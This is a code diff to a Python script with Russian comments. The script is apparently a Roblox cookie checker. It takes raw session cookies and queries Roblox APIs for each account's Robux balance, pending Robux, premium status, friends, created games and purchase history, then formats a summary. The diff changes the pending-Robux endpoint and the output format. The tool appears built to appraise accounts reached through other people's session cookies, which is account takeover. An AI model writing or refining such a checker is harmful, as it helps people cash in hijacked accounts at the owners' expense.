@@ -50,9 +50,9 @@ def get_created_places(u_id):
     except: return "Скрыто"
 
 def get_pending_robux(u_id, cookies):
-    """Получает робуксы, которые висят в ожидании"""
+    """Метод через revenue summary (видит даже мелкий пендинг)"""
     try:
-        url = f"https://economy.roblox.com/v2/users/{u_id}/transaction-totals?timeFrame=Month&transactionType=summary"
+        url = f"https://economy.roblox.com/v1/users/{u_id}/revenue/summary/30day"
         res = requests.get(url, cookies=cookies, timeout=5).json()
         return res.get('pendingRobux', 0)
     except: return 0
@@ -77,8 +77,11 @@ def check_cookie(raw_text):
         u_id, u_name = u['id'], u['name']
         
         reg_date, age_days, premium, friends = get_extra_info(u_id)
-        robux = requests.get(f"https://economy.roblox.com/v1/users/{u_id}/currency", cookies=cookies).json().get('robux', 0)
-        pending = get_pending_robux(u_id, cookies) # Чекер пендинга
+        robux_data = requests.get(f"https://economy.roblox.com/v1/users/{u_id}/currency", cookies=cookies).json()
+        robux = robux_data.get('robux', 0)
+        
+        # Получаем пендинг
+        pending = get_pending_robux(u_id, cookies)
         created = get_created_places(u_id)
         
         sales = requests.get(f"https://economy.roblox.com/v2/users/{u_id}/transactions?transactionType=Purchase&limit=50", cookies=cookies).json()
@@ -106,13 +109,12 @@ def check_cookie(raw_text):
     except: return {"status": "error"}
 
 def format_output(res):
-    # Добавляем инфу про пендинг в вывод
-    pending_str = f" (+ {res['pending']} ⏳)" if res['pending'] > 0 else ""
+    # Теперь пишет пендинг ВСЕГДА, даже если он 0
     return (
         f"👤 Аккаунт: {res['name']} (ID: {res['id']})\n"
         f"🗓 Регистрация: {res['reg_date']} ({res['age']} дн.)\n"
         f"🌟 Premium: {res['premium']} | 👥 Друзья: {res['friends']}\n"
-        f"💰 Баланс: {res['robux']} R${pending_str}\n\n"
+        f"💰 Баланс: {res['robux']} R$ (Пендинг: {res['pending']} ⏳)\n\n"
         f"🛠 СОЗДАННЫЕ ИГРЫ: {res['created_games']}\n\n"
         f"💸 ТРАТЫ:\n{res['details']}"
         f"--- Всего по списку: {res['spent']} R$ ---\n\n"
